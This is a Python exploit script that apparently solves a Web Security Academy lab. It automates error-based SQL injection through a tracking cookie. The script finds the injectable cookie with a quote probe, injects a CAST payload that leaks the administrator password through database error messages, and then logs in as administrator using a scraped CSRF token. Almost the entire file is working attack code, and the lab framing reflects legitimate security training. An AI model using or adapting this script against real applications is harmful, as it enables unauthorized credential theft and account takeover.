import re
import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

from bs4 import BeautifulSoup
from requests import Response
from requests.exceptions import RequestException
from requests.sessions import Session

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.target_cookie: Optional[str] = None

    def _send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[Response]:
        """Helper handles all HTTP communication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except RequestException as e:
            print(f"[-] Connection error: {e}")
            return None

    def is_active(self) -> bool:
        print("[*] Phase 1: Checking lab availability...")
        res = self._send_request("")
        return res is not None and "academyLabBanner" in res.text

    def identify_vulnerable_cookie(self) -> Optional[str]:
        """Identifies vulnerable cookie"""
        print("[*] Phase 2: Identifying vulnerable cookie...")
        for cookie in self.session.cookies:
            original_value = cookie.value
            payload = "'"
            cookie.value = f"{original_value}{payload}"
            res = self._send_request("")
            cookie.value = original_value
            if res is not None and res.status_code == 500:
                self.target_cookie = cookie.name
                print(f"[+] Identified vulnerable cookie: {cookie.name}")
                return cookie.name
        return None

    def extract_sql_error(self, html_content: str) -> Optional[str]:
        """Extract SQL error from response"""
        soup = BeautifulSoup(html_content, "html.parser")
        error_tag = soup.find("p", class_="is-warning")
        return error_tag.get_text(strip=True) if error_tag else None

    def extract_via_error(self, subquery: str) -> Optional[str]:
        """Triggers a CAST error and parses the resutl from the response text"""
        if not self.target_cookie:
            return None

        payload = f"'||CAST(({subquery})AS int)--"
        for cookie in self.session.cookies:
            if cookie.name == self.target_cookie:
                original_value = cookie.value
                # cookie.value = f"{original_value}{payload}"
                cookie.value = f"{payload}"
                res = self._send_request("")
                cookie.value = original_value

                if res is not None and res.status_code == 500:
                    sql_error_msg = self.extract_sql_error(res.text)
                    match = re.search(
                        r'syntax for type integer:\s*"(.+?)"',
                        sql_error_msg if sql_error_msg else "",
                    )
                    return match.group(1) if match else None

        return None

    def exfiltrate_credentials(
        self, column_name: str, table_name: str, where_clause: str
    ) -> Optional[str]:
        """Exfiltrates administrator credential using visible SQL error"""
        print("[*] Phase 3: Exfiltrating credential...")
        # There is length limit
        # sql_query = f"SELECT {column_name} FROM {table_name} WHERE {where_clause}"
        # sql_query = f"SELECT username FROM {table_name}"
        # sql_query = f"SELECT username FROM {table_name} LIMIT 1"
        sql_query = f"SELECT {column_name} FROM {table_name} LIMIT 1"
        extracted_data = self.extract_via_error(sql_query)
        print(f"[+] Exfiltrated administrator password: {extracted_data}")
        return extracted_data

    def authenticate_and_verify(self, username: str, password: str) -> bool:
        """Authenticates and verifies if lab reached solved state"""
        print(f"[*] Phase 4: Attempting to login as: {username}...")
        # Step 1: Extract the CSRF token
        res_login = self._send_request("login")
        if res_login is None or res_login.status_code != 200:
            print("[-] Could not load login page!")
            return False

        soup = BeautifulSoup(res_login.text, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        csrf_token = str(csrf_tag.get("value")) if csrf_tag else None
        if not csrf_token:
            print("[-] Could not find CSRF token in login page!")
            return False
        print(f"[+] Extracted CSRF token: {csrf_token}")

        # Step 2: Login
        login_date = {"csrf": csrf_token, "username": username, "password": password}
        self._send_request("login", data=login_date, method="POST")

        # Step 3: Verify
        res = self._send_request("")
        return res is not None and "Congratulation" in res.text

    def solve(self) -> None:
        # Check lab availability
        if not self.is_active():
            print("[-] Lab inactive or expired!")
            return

        # identify vulerable cookie
        if not self.identify_vulnerable_cookie():
            print("[-] No vulnerable cookie found!")
            return

        # exfiltrate credentials
        admin_pass = self.exfiltrate_credentials(
            "password", "users", "username='administrator'"
        )
        if not admin_pass:
            print("[-] Unable to exfiltrate 'administrator' credential!")
            return

        # login and verfiy
        if self.authenticate_and_verify("administrator", admin_pass):
            print("[!] SUCESS: Logged in and lab solved")
        else:
            print("[-] Lab not solved!")

        pass


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
